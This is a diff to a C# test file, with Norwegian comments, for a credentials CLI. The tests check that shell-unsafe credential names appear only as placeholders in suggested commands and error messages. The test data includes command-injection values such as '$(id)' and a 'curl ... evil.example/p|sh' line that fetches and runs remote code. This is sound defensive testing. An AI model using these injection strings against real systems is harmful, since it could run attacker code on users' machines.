@@ -8,7 +8,8 @@ namespace Queuey.Client.Waas.Tests;
 /// <summary>
 /// Én regel for hvordan en credential lagres, i advise, plan og apply (før tag, 2026-10-06). Utenfor dev limer en person inn
 /// verdien med credentials request (F2.9, playbookene fra F2.11). I dev settes den fra en variabel med credentials set. Begge
-/// veier nevnes. Før foreslo plan og apply credentials set også i prod.
+/// veier nevnes. Før foreslo plan og apply credentials set også i prod. Et navn står i kommandoen bare i formen et skall leser
+/// som det er (review av #58, B1).
 /// </summary>
 public class CredentialStoringTests
 {
@@ -92,6 +93,57 @@ public class CredentialStoringTests
     public void A_deliverys_auth_mode_names_the_type_of_its_credential(string? authMode, string? type)
         => Assert.Equal(type, CredentialStoring.TypeForAuthMode(authMode));
 
+    // ── navn et skall ville lest som mer enn et navn (B1 i runde 2 av #58) ──
+
+    [Theory]
+    [InlineData("x;id;#")]
+    [InlineData("x;curl -s https://evil.example/p|sh;#")]
+    [InlineData("$(id)")]
+    [InlineData("`id`")]
+    [InlineData("$PARTNER_KEY")]   // uten klammer utvides den ikke, og hemmeligheten ville havnet i argv
+    [InlineData("-h")]
+    [InlineData("--json")]
+    [InlineData("10357116968d81d19f15e6a967c9e748")]   // hex, som en hemmelighet
+    public void A_name_a_shell_reads_as_more_than_a_name_shows_as_a_placeholder_with_how_to_rename_it(string name)
+    {
+        foreach (string environment in new[] { "prod", "dev" })
+        {
+            var storing = new CredentialStoring(environment, profile: null);
+
+            Assert.Equal("queuey credentials request <NAME> --type ApiKeyHeader", storing.Request(name, "ApiKeyHeader"));
+            Assert.Equal("queuey credentials set --name <NAME> --type HmacSigning --key-id <NAME> --from-env <VARIABLE>",
+                storing.Set(name, "HmacSigning"));
+            string how = storing.HowToStore(name, "ApiKeyHeader");
+            Assert.EndsWith(" " + CredentialStoring.NotShown, how, StringComparison.Ordinal);
+            if (name != "--json")   // credentials list --json står i teksten uansett
+                Assert.DoesNotContain(name, how, StringComparison.Ordinal);
+        }
+    }
+
+    [Fact]
+    public void A_variable_that_is_not_a_variable_name_shows_as_a_placeholder()
+        => Assert.Equal("queuey credentials set --name partner-key --type ApiKeyHeader --from-env <VARIABLE>",
+            new CredentialStoring("dev", profile: null).Set("partner-key", "ApiKeyHeader", "X;id"));
+
+    [Fact]
+    public async Task A_delivery_credential_whose_name_cannot_be_shown_is_neither_in_the_error_nor_in_its_commands()
+    {
+        string file = MissingDeliveryCredential.Replace("@ENV@", "")
+            .Replace("\"partner-key\"", "\"x;curl -s https://evil.example/p|sh;#\"");
+
+        QueueyConfigurationException ex = await ApplyFails(DeploymentFile.Parse(file),
+            new { publicId = "cred_1", name = "orders-key", type = "ApiKeyHeader" },
+            new { publicId = "cred_2", name = "$(id)", type = "ApiKeyHeader" });
+
+        Assert.StartsWith("No credential with the name the file gives in workspace ten_abc (workspace.delivery.credentialRef). " +
+                          "Nothing was changed. Store it first. A person pastes the value, so it never passes through you: queuey " +
+                          "credentials request <NAME> --type ApiKeyHeader prints a link", ex.Message);
+        Assert.Contains(CredentialStoring.NotShown, ex.Message);
+        Assert.EndsWith("Available: orders-key, and 1 whose name is not shown.", ex.Message);
+        foreach (string piece in new[] { "curl", "evil", "|sh", "$(id)" })
+            Assert.DoesNotContain(piece, ex.Message);
+    }
+
     // ── plan og apply ────────────────────────────────────────────────────
 
     [Theory]
@@ -158,13 +210,13 @@ public class CredentialStoringTests
         Assert.Contains("queuey credentials list --profile prod --json", ex.Message);
     }
 
-    /// <summary>Apply against a workspace without credentials: it fails before its first write, with what to do.</summary>
-    private static async Task<QueueyConfigurationException> ApplyFails(DeploymentFile file)
+    /// <summary>Apply against a workspace with <paramref name="stored"/> as its credentials: it fails before its first write, with what to do.</summary>
+    private static async Task<QueueyConfigurationException> ApplyFails(DeploymentFile file, params object[] stored)
     {
         var api = new StubHttpMessageHandler(req =>
             StubHttpMessageHandler.DeployDefaults(req)
             ?? (req.Method == HttpMethod.Get && req.RequestUri!.AbsolutePath.EndsWith("/credentials", StringComparison.Ordinal)
-                ? StubHttpMessageHandler.Json(HttpStatusCode.OK, Array.Empty<object>())
+                ? StubHttpMessageHandler.Json(HttpStatusCode.OK, stored)
                 : throw new InvalidOperationException("unexpected " + req.Method + " " + req.RequestUri!.AbsolutePath)));
 
         QueueyService service = WaasTestHost.Build(apiStub: api);
